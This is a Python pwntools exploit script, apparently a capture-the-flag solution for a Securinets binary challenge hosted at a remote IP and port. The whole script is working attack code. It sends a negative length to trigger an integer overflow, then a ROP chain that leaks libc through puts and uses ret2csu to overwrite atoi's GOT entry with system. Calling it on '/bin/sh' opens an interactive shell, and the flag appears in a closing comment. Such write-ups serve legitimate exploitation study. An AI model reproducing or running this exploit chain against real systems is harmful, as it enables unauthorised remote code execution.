from pwn import *
elf = ELF('./main', checksec=False)
#libc = ELF('/usr/lib/libc.so.6', checksec=False)
libc = ELF('./libc6_2.30-0ubuntu2_amd64.so', checksec=False)

#p = elf.process()
p = remote('54.225.38.91', 1027)

p.sendlineafter('length:', '-1')    # integer overflow
p.sendlineafter('ID:', '1')         # nothing

writeable = 0x601100
str_read = 0x4004b0
payload = ''.join([
    'A'*120,

    p64(0x0000000000400a93), # pop rdi
    p64(elf.got['atoi']),
    p64(elf.plt['puts']),

    p64(0x00400a8a),            # ret2csu

    p64(0),                     # rbx
    p64(1),                     # rbp
    p64(elf.got['read']),       # r12 -> func
    p64(0),                     # r13 -> rdi
    p64(writeable),             # r14 -> rsi
    p64(8),                     # r15 -> rdx

    p64(0x00400a70),            # call func
    p64(0),  # add rsp, 8
    
    p64(0),                     # rbx
    p64(1),                     # rbp
    p64(elf.got['read']),       # r12 -> func
    p64(0),                     # r13 -> rdi
    p64(elf.got['atoi']),             # r14 -> rsi
    p64(8),                     # r15 -> rdx

    p64(0x00400a70),            # call func
    p64(0),  # add rsp, 8

    p64(0),                     # rbx
    p64(1),                     # rbp
    p64(elf.got['atoi']),       # r12 -> func
    p64(writeable),             # r13 -> rdi
    p64(0),                     # r14 -> rsi
    p64(0),                     # r15 -> rdx

    p64(0x00400a70),            # call func
])
p.sendafter('message:', payload)

libc.address = u64(p.recvlines(3)[-1].strip().ljust(8, '\x00')) - libc.sym['atoi']
log.info('libc base : 0x%x'%libc.address)

p.send('/bin/sh\x00')
p.send(p64(libc.sym['system']))
p.interactive()
# securinets{b3_c4r3full_1nt_0verfl0w5_4r3_d4ng3r0u5!}